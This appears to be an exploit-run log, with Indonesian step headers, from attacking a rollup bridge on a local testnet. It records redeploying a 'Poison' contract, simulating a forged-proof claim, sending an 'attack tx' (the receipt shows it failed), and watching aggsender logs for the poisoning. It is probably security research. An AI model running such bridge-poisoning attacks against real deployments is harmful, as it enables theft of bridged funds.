@@ -1,0 +1,44 @@
+═══ [1] patch Poison.sol — call-1 kirim proof utk KEDUA slot (rollup-flag claim) ═══════
+Traceback (most recent call last):
+  File "<stdin>", line 12, in <module>
+AssertionError: pattern call-1 tidak ketemu
+
+═══ [2] rebuild (via_ir paris — sudah di foundry.toml) ═══════
+Solc 0.8.20 finished in 47.79s
+bytecode: 3984 hex
+
+═══ [3] redeploy Poison (wiring bridge 0x4ed7) ═══════
+POISON=0xb7278a61aa25c888815afc32ad3cc52ff24fe575
+
+═══ [4] ladder proof blob + state values ═══════
+R_ROLLUP=0x2a8b9459965ea87ae071e20f90b0dd1acf0816a4c2fe05ed05173bb3248394b3 (sama dengan s11: 0x2a8b... — konsisten)
+
+═══ [5] pastikan map entry masih ada (MER, R) ═══════
+map[keccak(MER,R)]: 96980382599051024532798461511112375539752545660157788693095985062946872423616 [9.698e76]
+
+═══ [6] SIMULATE dengan LADDER proof (bukan zero) ═══════
+    │   │   └─ ← [Stop]
+    │   ├─ emit ClaimEvent(globalIndex: 0, originNetwork: 0, originAddress: 0x0000000000000000000000000000000000000000, destinationAddress: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, amount: 1000000000000000 [1e15])
+
+══════════════════════════════════════════════════════════════
+═══ SIMULATE LOLOS — ATTACK TX FINAL: claim valid + racun LIFO ═══
+══════════════════════════════════════════════════════════════
+attack tx: 0xb8cc16c2ad95e5379da8e64ca096f6f6f58cf08d597501767ea8d28e6b95a187
+receipt: {"status":"0x0","gasUsed":"0x1ac33","logs":0,"topics":[]}
+selector count (harus 2): 2
+
+═══ [7] POISONING PIPELINE — 60s observasi ═══════
+2026-08-22T19:28:36.036Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 17674, numBridges: 3, numClaims: 0, createdAt: 1787426916 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:28:42.040Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 17680, numBridges: 3, numClaims: 0, createdAt: 1787426922 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:28:48.052Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 17686, numBridges: 3, numClaims: 0, createdAt: 1787426928 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:28:54.059Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 17692, numBridges: 3, numClaims: 0, createdAt: 1787426934 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:29:00.069Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 17697, numBridges: 3, numClaims: 0, createdAt: 1787426940 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:29:06.077Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 17704, numBridges: 3, numClaims: 0, createdAt: 1787426946 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:29:12.088Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 17710, numBridges: 3, numClaims: 0, createdAt: 1787426952 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:29:18.092Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 17716, numBridges: 3, numClaims: 0, createdAt: 1787426958 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:29:24.100Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 17722, numBridges: 3, numClaims: 0, createdAt: 1787426964 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:29:30.109Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 17728, numBridges: 3, numClaims: 0, createdAt: 1787426970 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:29:36.115Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 17734, numBridges: 3, numClaims: 0, createdAt: 1787426976 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:29:42.123Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 17740, numBridges: 3, numClaims: 0, createdAt: 1787426982 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+
+cdk-node	Up 51 minutes
